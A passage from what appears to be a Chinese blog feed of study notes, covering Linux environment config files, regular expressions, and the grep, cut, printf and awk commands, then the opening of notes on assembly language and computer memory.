<h4 id="变量测试与内容替换"><a href="#变量测试与内容替换" class="headerlink" title="变量测试与内容替换"></a>变量测试与内容替换</h4><p><img src="https://i.loli.net/2021/02/22/GhwCUnPTuS7QJol.png" alt=""></p>
<h3 id="环境变量配置文件"><a href="#环境变量配置文件" class="headerlink" title="环境变量配置文件"></a>环境变量配置文件</h3><h4 id="环境变量配置文件简介"><a href="#环境变量配置文件简介" class="headerlink" title="环境变量配置文件简介"></a>环境变量配置文件简介</h4><h5 id="source命令"><a href="#source命令" class="headerlink" title="source命令"></a>source命令</h5><p>[root@localhost~]# source 配置文件<br>或<br>[root@localhost~]# . 配置文件</p>
<p>让配置文件直接生效而不用注销或重新登录</p>
<h5 id="环境变量配置文件简介-1"><a href="#环境变量配置文件简介-1" class="headerlink" title="环境变量配置文件简介"></a>环境变量配置文件简介</h5><ul>
<li>环境变量配置文件中主要是定义对系统的操作环境生效的系统默认环境变量,比如PATH、HISTSIZE、PS1、HOSTNAME等默认环境变量</li>
<li>/etc/profile</li>
<li>/etc/profile.d/*.sh</li>
<li>~/.bash_profile</li>
<li>~/.bashrc</li>
<li>/etc/bashrc</li>
<li>位于/etc目录下的环境变量配置文件对全局(任何用户)起作用</li>
</ul>
<h4 id="环境变量配置文件作用"><a href="#环境变量配置文件作用" class="headerlink" title="环境变量配置文件作用"></a>环境变量配置文件作用</h4><p>越往后文件优先级越高</p>
<p><img src="https://i.loli.net/2021/02/23/1CZxXnVHYudBjvf.png" alt=""></p>
<h5 id="etc-profile的作用"><a href="#etc-profile的作用" class="headerlink" title="/etc/profile的作用"></a>/etc/profile的作用</h5><ul>
<li>USER变量</li>
<li>LOGNAME变量</li>
<li>MAIL变量</li>
<li>PATH变量</li>
<li>HOSTNAME变量</li>
<li>HISTSIZE变量</li>
<li>umask</li>
<li>调用/etc/profile.d/* .sh文件</li>
</ul>
<h5 id="bash-profile的作用"><a href="#bash-profile的作用" class="headerlink" title="~/.bash_profile的作用"></a>~/.bash_profile的作用</h5><ul>
<li>调用了~/.bashrc文件</li>
<li>在PATH变量后面加入了”:$HOME/bin”这个目录</li>
</ul>
<h5 id="etc-bashrc的作用"><a href="#etc-bashrc的作用" class="headerlink" title="/etc/bashrc的作用"></a>/etc/bashrc的作用</h5><ul>
<li>定义登录提示符</li>
</ul>
<h4 id="其他配置文件和登录信息"><a href="#其他配置文件和登录信息" class="headerlink" title="其他配置文件和登录信息"></a>其他配置文件和登录信息</h4><h5 id="注销时生效的环境变量配置文件"><a href="#注销时生效的环境变量配置文件" class="headerlink" title="注销时生效的环境变量配置文件"></a>注销时生效的环境变量配置文件</h5><ul>
<li>~/.bash_logout</li>
<li>默认为空</li>
</ul>
<h5 id="其他配置文件"><a href="#其他配置文件" class="headerlink" title="其他配置文件"></a>其他配置文件</h5><ul>
<li>~/bash_history</li>
</ul>
<h5 id="shell登录信息"><a href="#shell登录信息" class="headerlink" title="shell登录信息"></a>shell登录信息</h5><ul>
<li>本地终端欢迎信息(登录前):/etc/issue</li>
</ul>
<p><img src="https://i.loli.net/2021/02/23/gZB7KiHf9kWltDx.png" alt=""></p>
<ul>
<li>远程终端欢迎信息(登录前):/etc/issue.net<ul>
<li>转义符在/etc/issue.net文件中不能使用</li>
<li>是否显示此欢迎信息,由ssh的配置文件/etc/ssh/sshd_config决定,加入“Banner /etc/issue.net”行才能显示(记得重启SSH服务:service sshd restart)</li>
</ul>
</li>
<li>登录后欢迎信息:/etc/motd<ul>
<li>不管是本地登录,还是远程登录,都可以显示此欢迎信息,只不过是登录后显示欢迎信息</li>
</ul>
</li>
</ul>
<h2 id="shell编程"><a href="#shell编程" class="headerlink" title="shell编程"></a>shell编程</h2><h3 id="基础正则表达式"><a href="#基础正则表达式" class="headerlink" title="基础正则表达式"></a>基础正则表达式</h3><h4 id="正则表达式与通配符"><a href="#正则表达式与通配符" class="headerlink" title="正则表达式与通配符"></a>正则表达式与通配符</h4><ul>
<li>正则表达式用来在文件中匹配符合条件的字符串,正则是包含匹配. grep、awk、sed等命令可以支持正则表达式</li>
<li>通配符用来在系统中匹配符合条件的文件名,通配符是完全匹配. ls、find、cp这些命令不支持正则表达式,所以只能使用shell自己的通配符来进行匹配了</li>
</ul>
<h4 id="基础正则表达式-1"><a href="#基础正则表达式-1" class="headerlink" title="基础正则表达式"></a>基础正则表达式</h4><div class="table-container">
<table>
<thead>
<tr>
<th>元字符</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>*</td>
<td>前一个字符匹配0次或任意多次</td>
</tr>
<tr>
<td>.</td>
<td>匹配除了换行符外任意一个字符</td>
</tr>
<tr>
<td>\^</td>
<td>匹配行首.例如:^hello会匹配以hello开头的行</td>
</tr>
<tr>
<td>$</td>
<td>匹配行尾.例如:hello$会匹配以hello结尾的行</td>
</tr>
<tr>
<td>[]</td>
<td>匹配中括号中指定的任意一个字符,只匹配一个字符.<br/>例如:[aoeiu]匹配任意一个元音字母,[0-9]匹配任意一位数字,<br/>[a-z] [0-9]匹配小写字母和一位数字构成的两位字符</td>
</tr>
<tr>
<td><sup><a href="#fn_" id="reffn_"></a></sup></td>
<td>匹配除中括号中的字符以外的任意一个字符.<br/>例如: [\^0-9]表示匹配任意一位非数字的字符,<br/>[\^a-z] 表示匹配任意一位非小写字母的字符</td>
</tr>
<tr>
<td>\</td>
<td>转义符.将特殊字符进行转义,忽略其特殊意义</td>
</tr>
<tr>
<td>\ {n\\}</td>
<td>表示其前面的字符恰好出现n次.<br/>例如: [0-9]\\{4\\}匹配4位数字,[1] [3-8] [0-9]\\{9\\} 匹配手机号码</td>
</tr>
<tr>
<td>\\ {n,\\}</td>
<td>表示其前面的字符出现不小于n次.<br/>例如: [0-9]\\{2,\\} 表示两位及以上的数字</td>
</tr>
<tr>
<td>\\ {n,m\\}</td>
<td>表示其前面的字符至少出现n次,最多出现m次.<br/>例如:[a-z]\\{6,8\\}匹配6到8位的小写字母</td>
</tr>
</tbody>
</table>
</div>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="string">&quot;*&quot;</span> 前一个字符匹配0次或任意多次</span></span><br><span class="line">grep &quot;a*&quot; test.txt</span><br><span class="line"><span class="meta">#</span><span class="bash">匹配所有内容，包括空白行</span></span><br><span class="line">grep &quot;aa*&quot; test.txt</span><br><span class="line"><span class="meta">#</span><span class="bash">匹配至少包含有一个a的行</span></span><br><span class="line">grep &quot;aaa*&quot; test.txt</span><br><span class="line"><span class="meta">#</span><span class="bash">匹配最少包含两个连续a的字符串</span></span><br><span class="line">grep &quot;aaaaa*&quot; test.txt</span><br><span class="line"><span class="meta">#</span><span class="bash">匹配最少包含四个连续a的字符串</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="string">&quot;.&quot;</span> 匹配除了换行符外任意一个字符</span></span><br><span class="line">grep &quot;s..d&quot; test.txt </span><br><span class="line"><span class="meta">#</span><span class="bash">“s..d”会匹配在s和d这两个字母之间一定有两个字符的单词</span></span><br><span class="line">grep &quot;s.*d&quot; test.txt </span><br><span class="line"><span class="meta">#</span><span class="bash">匹配在s和d字母之间有任意字符(任意个)</span></span><br><span class="line">grep &quot;.*&quot; test.txt</span><br><span class="line"><span class="meta">#</span><span class="bash">匹配所有内容</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="string">&quot;^&quot;</span> 匹配行首,<span class="string">&quot;$&quot;</span> 匹配行尾</span></span><br><span class="line">grep &quot;^M&quot; test.txt </span><br><span class="line"><span class="meta">#</span><span class="bash">匹配以大写“M”开头的行</span></span><br><span class="line">grep &quot;n$&quot; test.txt</span><br><span class="line"><span class="meta">#</span><span class="bash">匹配以小写“n”结尾的行</span></span><br><span class="line">grep -n &quot;^$&quot; test.txt</span><br><span class="line"><span class="meta">#</span><span class="bash">匹配空白行</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="string">&quot;[]&quot;</span>匹配中括号里面指定的任意一个字符,只匹配一个字符</span></span><br><span class="line">grep &quot;s[ao]id&quot; test.txt</span><br><span class="line"><span class="meta">#</span><span class="bash">匹配s和i字母之间,要不是a、要不是o</span></span><br><span class="line">grep &quot;[0-9]&quot; test.txt</span><br><span class="line"><span class="meta">#</span><span class="bash">匹配任意0到9中一个数字</span></span><br><span class="line">grep&quot;^[a-z]&quot; test.txt</span><br><span class="line"><span class="meta">#</span><span class="bash">匹配用小写字母开头的行</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="string">&quot;[^]&quot;</span>匹配除中括号里面字符以外的任意一个字符</span></span><br><span class="line">grep &quot;^[^a-z]&quot; test.txt</span><br><span class="line"><span class="meta">#</span><span class="bash">匹配不用小写字母开头的行</span></span><br><span class="line">grep &quot;^[^a-zA-Z]&quot; test.txt</span><br><span class="line"><span class="meta">#</span><span class="bash">匹配不用字母开头的行</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="string">&quot;\&quot; 转义符</span></span></span><br><span class="line">grep &quot;\.$&quot; test.txt</span><br><span class="line"><span class="meta">#</span><span class="bash">匹配使用“.”结尾的行</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">“\&#123;n\&#125;”表示其前面的字符恰好出现n次</span></span><br><span class="line">grep &quot;a\&#123;3\&#125;&quot; test.txt</span><br><span class="line"><span class="meta">#</span><span class="bash">匹配a字母连续出现三次的字符串</span></span><br><span class="line">grep &quot;[0-9]\&#123;3\&#125;&quot; test.txt</span><br><span class="line"><span class="meta">#</span><span class="bash">匹配包含连续的三个数字的字符串</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">“\&#123;n,\&#125;”表示其前面的字符出现不小于n次</span></span><br><span class="line">grep &quot;^[0-9]\&#123;3,\&#125;&quot; test.txt</span><br><span class="line"><span class="meta">#</span><span class="bash">匹配最少用连续三个数字开头的行</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">“\&#123;n,m)&#125;”匹配其前面的字符至少出现n次,最多出现m次</span></span><br><span class="line">grep &quot;sa\&#123;1,3\&#125;i&quot; test.txt</span><br><span class="line"><span class="meta">#</span><span class="bash">匹配在字母s和字母i之间有最少一个a,最多三个a</span></span><br></pre></td></tr></table></figure>
<p><a href="https://man.linuxde.net/docs/shell_regex.html">拓展</a></p>
<h3 id="字符截取命令"><a href="#字符截取命令" class="headerlink" title="字符截取命令"></a>字符截取命令</h3><h4 id="cut命令"><a href="#cut命令" class="headerlink" title="cut命令"></a>cut命令</h4><p>cut命令要和grep命令结合使用</p>
<p>[root@localhost ~]# cut [选项] 文件名<br>选项:<br>    -f 列号        提取第几列(列与列之间是制表符(Tab键),不能是空格)<br>    -d 分隔符   按照指定分隔符分割列(默认为制表符)</p>
<p>下面以test.txt为例说明</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210226172810850.png" alt=""></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cut -f 2 test.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210226172721757.png" alt=""></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cut -f 2,3 test.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210226172849456.png" alt=""></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cut -d &quot;:&quot; -f 1,3 /etc/passwd</span><br><span class="line"><span class="meta">#</span><span class="bash">/etc/passwd以冒号分隔</span></span><br></pre></td></tr></table></figure>
<h5 id="使用cut截取用户名"><a href="#使用cut截取用户名" class="headerlink" title="使用cut截取用户名"></a>使用cut截取用户名</h5><p>使用cut截取登录shell为/bin/bash的用户(root除外)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd | grep /bin/bash | grep -v root | cut -d &quot;:&quot; -f 1</span><br></pre></td></tr></table></figure>
<p>说明:</p>
<ul>
<li>cat /etc/passwd   查看/etc/passwd文件</li>
<li>grep /bin/bash     查找/etc/passwd中含有/bin/bash的行(root也在内)</li>
<li>grep -v root           排除含有/bin/bash的行中的root</li>
<li>cut -d “:” -f 1          以”:”为分隔符截取第一列的用户名</li>
</ul>
<h5 id="cut命令的局限"><a href="#cut命令的局限" class="headerlink" title="cut命令的局限"></a>cut命令的局限</h5><p>根据下面例子感受cut命令的局限</p>
<p>使用df -h查看系统占用情况</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">df -h</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210226193910604.png" alt=""></p>
<p>我们想要达到这样的效果,当根目录的Use%(使用率,上图中为14%)达到70%会警告用户,因此我们需要截取根目录的Use%部分</p>
<p>首先查找根目录所在行,可以看到根目录在/dev/vad1,使用grep查找其中含有vad1字段的行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">df -h | grep &quot;vda1&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210226193536662.png" alt=""></p>
<p>接下来截取图中的14%,我们使用cut截取,可以看到14%在第5列</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">df -h | grep &quot;vda1&quot; | cut -f 5 </span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210226194606942.png" alt=""></p>
<p>可以看出并没有截取到14%,这是因为列与列的间隙不是制表符,而是空格,那么我们使用下面这个命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">df -h | grep &quot;vda1&quot; | cut -d &quot; &quot; -f 5 </span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210226194901137.png" alt=""></p>
<p>可见提取出的是空白,这是因为我们选择的分隔符为一个空格,所以提取到空白列</p>
<p>想要实现该功能需要借助awk命令,cut命令无法做到</p>
<h4 id="awk命令"><a href="#awk命令" class="headerlink" title="awk命令"></a>awk命令</h4><p>在awk命令的输出中支持print和printf命令</p>
<ul>
<li>print命令:print会在每个输出之后自动加入一个换行符(Linux 默认没有print命令)</li>
<li>printf命令:printf是标准格式输出命令,并不会自动加入换行符,如果需要换行,需要手工加入换行符</li>
</ul>
<h5 id="printf命令"><a href="#printf命令" class="headerlink" title="printf命令"></a>printf命令</h5><p>printf命令后不能直接跟文件名,cat命令运行的结果也不能通过管道符使用printf输出</p>
<p>格式化输出命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">printf &#x27;输出类型输出格式&#x27; 输出内容</span><br></pre></td></tr></table></figure>
<h6 id="输出类型"><a href="#输出类型" class="headerlink" title="输出类型"></a>输出类型</h6><p>%ns        输出字符串,n是数字指代输出几个字符<br>%ni        输出整数,n是数字指代输出几个数字<br>%m.nf   输出浮点数,m和n是数字,指代输出的数字位数和小数位数.如%8.2f代表共输出8位数,其中2位是小数,6位是整数</p>
<h6 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h6><p>\a          输出警告声音<br>\b          输出退格键,也就是Backspace键<br>\f           清除屏幕<br>\n          换行<br>\r           回车,也就是Enter键<br>\t           水平输出退格键,也就是Tab键<br>\v          垂直输出退格键,也就是Tab键</p>
<p>例子</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">printf %s 1 2 3 4 5 6</span><br><span class="line"><span class="meta">#</span><span class="bash">没有加引号,把后面的数字当成整体输出</span></span><br><span class="line">printf %s %s %s 1 2 3 4 5 6</span><br><span class="line"><span class="meta">#</span><span class="bash">只有第一个%s起了作用,后面其他的被当成普通字符串输出</span></span><br><span class="line">printf &#x27;%s %s %s&#x27; 1 2 3 4 5 6</span><br><span class="line"><span class="meta">#</span><span class="bash">三个%s均起作用,分别输出1,2,3,(空格输出空格)然后直接输出4 5 6,因为最后一个%s后面没有空格,使用3和4之间没有空格</span> </span><br><span class="line">printf &#x27;%s %s %s\n&#x27; 1 2 3 4 5 6</span><br><span class="line"><span class="meta">#</span><span class="bash">三个%s均起作用,分别输出1,2,3,然后\n换行,再输出4 5 6</span></span><br><span class="line">printf &#x27;%s %s %s &#x27; 1 2 3 4 5 6</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210227164005664.png" alt=""></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">使用cat查看test.txt</span></span><br><span class="line">cat test.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210227164805994.png" alt=""></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">将cat test.txt的结果作为<span class="built_in">printf</span>的输入</span></span><br><span class="line">printf &#x27;%s&#x27; $(cat test.txt)</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">printf</span>命令后不能直接跟文件名</span></span><br><span class="line">printf &#x27;%s&#x27; test.txt</span><br><span class="line"><span class="meta">#</span><span class="bash">cat命令运行的结果也不能通过管道符使用<span class="built_in">printf</span>输出</span></span><br><span class="line">cat test.txt | printf &#x27;%s&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210227165459937.png" alt=""></p>
<h5 id="awk命令格式"><a href="#awk命令格式" class="headerlink" title="awk命令格式"></a>awk命令格式</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">awk &#x27;条件1&#123;动作1&#125; 条件2&#123;动作2&#125;...&#x27; 文件名</span><br></pre></td></tr></table></figure>
<p>条件:</p>
<ul>
<li>关系表达式,例如: x&gt;10,x&lt;=10</li>
<li>BEGIN (在读取数据之前执行其后的动作)</li>
<li>END (在所有动作执行完,再执行其后动作)</li>
</ul>
<p>动作:</p>
<ul>
<li>格式化输出</li>
<li>流程控制语句</li>
</ul>
<p>下面以test.txt为例说明:</p>
<blockquote>
<p>查看test.txt    cat test.txt</p>
</blockquote>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210228185800661.png" alt=""></p>
<blockquote>
<p>使用awk截取其中的第2,4列</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">awk &#x27;&#123;printf $2 &quot;\t&quot; $4&quot;\n&quot;&#125;&#x27; test.txt</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="variable">$2</span>表示第2列,<span class="variable">$4</span>表示第4列</span></span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210228190025765.png" alt=""></p>
<p>关于cut命令的局限,awk命令则不存在,下面举例说明</p>
<blockquote>
<p>使用df -h查看系统相关信息</p>
</blockquote>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210228190527438.png" alt=""></p>
<blockquote>
<p>使用awk截取/dev/vda1行中的14%</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">df -h | grep vda1 | awk &#x27;&#123;print $5&#125;&#x27; | cut -d &quot;%&quot; -f 1</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210228190815576.png" alt=""></p>
<h5 id="关系表达式"><a href="#关系表达式" class="headerlink" title="关系表达式"></a>关系表达式</h5><blockquote>
<p>使用cat test.txt查看test.txt</p>
</blockquote>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210228194934658.png" alt=""></p>
<blockquote>
<p>提取其中Mark小于80的姓名</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat test.txt | grep -v Name | awk &#x27;$4&lt;=80&#123;print $2&quot;\n&quot;&#125;&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210228194925571.png" alt="image-20210228194925571"></p>
<h5 id="BEGIN"><a href="#BEGIN" class="headerlink" title="BEGIN"></a>BEGIN</h5><p>在读取数据之前执行其后的动作</p>
<blockquote>
<p>在截取test.txt第2,4列之前先执行BEGIN后的命令</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">awk &#x27;BEGIN&#123;print &quot;hello world!&quot;&#125; &#123;print $2 &quot;\t&quot; $4&quot;\n&quot;&#125;&#x27; test.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210228191408806.png" alt=""></p>
<blockquote>
<p>截取/etc/passwd的第1,3列</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">awk &#x27;&#123;FS=&quot;:&quot;&#125; &#123;print $1 &quot;\t&quot; $3&#125;&#x27; /etc/passwd</span><br></pre></td></tr></table></figure>
<blockquote>
<p>由下图可见,/etc/passwd中的第一行并没有处理</p>
<p>awk会先读入第一行数据,再执行命令</p>
</blockquote>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210228193119168.png" alt=""></p>
<blockquote>
<p>加上BEGIN,会在读入第一行数据之前,先执行命令</p>
</blockquote>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210228193512426.png" alt=""></p>
<h5 id="END"><a href="#END" class="headerlink" title="END"></a>END</h5><p>在所有命令执行完毕,再执行其后的命令</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210228194138995.png" alt="太长了,拼的图"></p>
<h5 id="FS内置变量"><a href="#FS内置变量" class="headerlink" title="FS内置变量"></a>FS内置变量</h5><p>用于指定分隔符</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">awk &#x27;&#123;print $1 &quot;\t&quot; $3&#125;&#x27; /etc/passwd</span><br></pre></td></tr></table></figure>
<blockquote>
<p>并没有起到提取第1列和第3列的效果</p>
</blockquote>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210228192029233.png" alt=""></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">awk &#x27;&#123;FS=&quot;:&quot;&#125; &#123;print $1 &quot;\t&quot; $3&#125;&#x27; /etc/passwd</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210228192406633.png" alt=""></p>
<h4 id="sed命令"><a href="#sed命令" class="headerlink" title="sed命令"></a>sed命令</h4><p>sed是一种几乎包括在所有UNIX平台(包括Linux)的轻量级流编辑器.sed主要是用来将数据进行选取、替换、删除、新增的命令</p>
<h3 id="字符处理命令"><a href="#字符处理命令" class="headerlink" title="字符处理命令"></a>字符处理命令</h3><h3 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h3><h3 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h3>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言学习笔记</title>
    <url>/article/42633.html</url>
    <content><![CDATA[<h1 id="汇编语言学习笔记"><a href="#汇编语言学习笔记" class="headerlink" title="汇编语言学习笔记"></a>汇编语言学习笔记</h1><a id="more"></a>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="机器语言"><a href="#机器语言" class="headerlink" title="机器语言"></a>机器语言</h3><p>机器语言是机器指令的集合.机器指令展开来讲就是一台机器可以正确执行的命令.电子计算机的机器指令是一列二进制数字.计算机将之转变为一列高低电平,以使计算机的电子器件受到驱动,进行运算.</p>
<ul>
<li>因为是以逻辑状态0和1直接命令,不需翻译直接执行,速度快</li>
<li>不同的处理器使用不同的机器语言,所以其可移植差</li>
<li>只有0和1变化组合,不仅难学、难懂、也不容易维护</li>
<li>机器指令能被计算机直接识别</li>
</ul>
<p><img src="https://i.loli.net/2021/02/26/mUXbFMxCcBv3KSI.png" alt=""></p>
<h3 id="汇编语言"><a href="#汇编语言" class="headerlink" title="汇编语言"></a>汇编语言</h3><p>由于机器语言在使用上的不便,因此工程师们便从机器语言中找出规则,而以英文字、数字符号来描述机器语言,使成为有意义的语言,这种语言便称为汇编语言.</p>
<p>汇编语言的主体是汇编指令.汇编指令和机器指令的差别在于指令的表示方法上.汇编指令是机器指令便于记忆的书写格式.</p>
<ul>
<li>这些具有特定功能的符号指令称为指令,例如:ADD代表[相加]、MOV代表[移动]</li>
<li>这些指令比起机器语言来说可算是较有意义、容易学习多了,而负责翻译的工具则称之为编译器</li>
<li>汇编指令需要通过编译器转为机器指令</li>
<li>每种CPU都有自己的汇编指令集</li>
</ul>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210226201333082.png" alt=""></p>
<h4 id="汇编语言的组成"><a href="#汇编语言的组成" class="headerlink" title="汇编语言的组成"></a>汇编语言的组成</h4><p>汇编语言发展至今,有以下3类指令组成:</p>
<ol>
<li>汇编指令:机器码的助记符,有对应的机器码</li>
<li>伪指令:没有对应的机器码,由编译器执行,计算机并不执行</li>
<li>其他符号:如+、-、*、/等,由编译器识别,没有对应的机器码</li>
</ol>
<p>汇编语言的核心是汇编指令,它决定了汇编语言的特性.</p>
<h3 id="指令和数据"><a href="#指令和数据" class="headerlink" title="指令和数据"></a>指令和数据</h3><p>指令和数据是应用上的概念.在内存或磁盘上,指令和数据没有任何区别,都是二进制信息.CPU在工作的时候把有的信息看作指令,有的信息看作数据,为同样的信息赋予了不同的意义.</p>
<h3 id="存储器"><a href="#存储器" class="headerlink" title="存储器"></a>存储器</h3><p>存储器:用于存储数据并在需要时提供数据</p>
<h4 id="存储器分类"><a href="#存储器分类" class="headerlink" title="存储器分类"></a>存储器分类</h4><p>CPU是计算机的核心部件,它控制整个计算机的运作并进行运算.要想让一个CPU工作,就必须向它提供指令和数据.指令和数据在存储器中存放,也就是我们平时所说的<br>内存.在一台PC机中内存的作用仅次于CPU.离开了内存.性能再好的CPU也无法工作.磁盘不同于内存,磁盘上的数据或程序如果不读到内存中,就无法被CPU使用.</p>
<p>一台PC机中,装有多个存储器芯片,这些存储器芯片从物理连接上看是独立的、不同的器件.从读写属性上看分为两类:随机存储器(RAM)和只读存储器(ROM).随机存储<br>器可读可写,但必须带电存储,关机后存储的内容丢失:只读存储器只能读取不能写入,关机后其中的内容不丢失.</p>
<ul>
<li>外部存储器:硬盘、光盘等等</li>
<li>内部存储器:<ul>
<li>RAM:内存条(随机存储器,断电消失)</li>
<li>ROM: BIOS芯片(只读存储器,断电不消失)</li>
</ul>
</li>
</ul>
<p>这些存储器从功能和连接上又可分为以下几类</p>
<ul>
<li><p>随机存储器</p>
<p>用于存放供CPU使用的绝大部分程序和数据,主随机存储器一般由两个位置上的RAM组成,装在主板上RAM和插在扩展插槽上的RAM</p>
</li>
<li><p>装有BIOS(Basic Input/Output System,基本输入/输出系统)的ROM<br>BIOS是由主板和各类接口卡(如显卡、网卡等)厂商提供的软件系统,可以通过它利用该硬件设备进行最基本的输入输出.在主板和某些接口卡上插有存储相应BIOS的ROM.例如,主板上的ROM中存储着主板的BIOS(通常称为系统BIOS);显卡上的ROM中存储着显卡的BIOS;如果网卡上装有ROM,那其中就可以存储网卡的BIOS</p>
</li>
<li><p>接口卡上的RAM<br>某些接口卡需要对大批量输入、输出数据进行暂时存储,在其上装有RAM.最典型的是显示卡上的RAM,一般称为显存.显示卡随时将显存中的数据向显示器上输出.换句话说,我们将需要显示的内容写入显存,就会出现在显示器上</p>
</li>
</ul>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210228064800853.png" alt=""></p>
<h4 id="内存地址空间"><a href="#内存地址空间" class="headerlink" title="内存地址空间"></a>内存地址空间</h4><p>上述的那些存储器,在物理上是独立的器件,但是在以下两点上相同:</p>
<ul>
<li>都和CPU的总线相连</li>
<li>CPU对它们进行读或写的时候都通过控制线发出内存读写命令</li>
</ul>
<p>这也就是说,CPU在操控它们的时候,把它们都当作内存来对待,把它们总的看作一个由若干存储单元组成的逻辑存储器,这个逻辑存储器就是我们所说的内存地址空间<br>,我们所面对的是内存地址空间.</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210228065349151.png" alt=""></p>
<p>所有的物理存储器被看作一个由若干存储单元组成的逻辑存储器,每个物理存储器在这个逻辑存储器中占有一个地址段,即一段地址空间.CPU在这段地址空间中读写数据,实际上就是在相对应的物理存储器中读写数据.</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210302165200886.png" alt=""></p>
<div class="note success">
            <p>不同的计算机系统的内存地址空间分配情况是不同的</p>
          </div>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210302165529743.png" alt="8086PC机的内存地址空间分配"></p>
<div class="note info">
            <p>最终运行程序的是CPU,我们用汇编语言编程的时候,必须要从CPU的角度考虑问题.对CPU来讲,系统中的所有存储器中的存储单元都处于一个统一的逻辑存储器中,它的容量受CPU寻址能力的限制.这个逻辑存储器即是我们所说的内存地址空间</p>
          </div>
<h4 id="存储单位"><a href="#存储单位" class="headerlink" title="存储单位"></a>存储单位</h4><ul>
<li>计算机中最小的信息单位是bit(比特),也就是一个二进制位</li>
<li>计算机中存储数据的最小单位是Byte(B字节)</li>
<li>8个bit组成一个B,也就是一字节</li>
<li>还可以用以下单位来计量容量:<ul>
<li>1024B=1KB (B=Byte)</li>
<li>1024KB=1MB</li>
<li>1024MB=1GB</li>
<li>1024GB=1TB</li>
</ul>
</li>
</ul>
<h4 id="存储单元"><a href="#存储单元" class="headerlink" title="存储单元"></a>存储单元</h4><ul>
<li>存储器被划分成了若干个存储单元,一个存储单元可以存储一个字节,也就是8个二进制位,每个存储单元是从0开始顺序编号</li>
<li>对于一个有128个存储单元的存储器:<ul>
<li>容量为128字节</li>
<li>编号就是从0-127</li>
</ul>
</li>
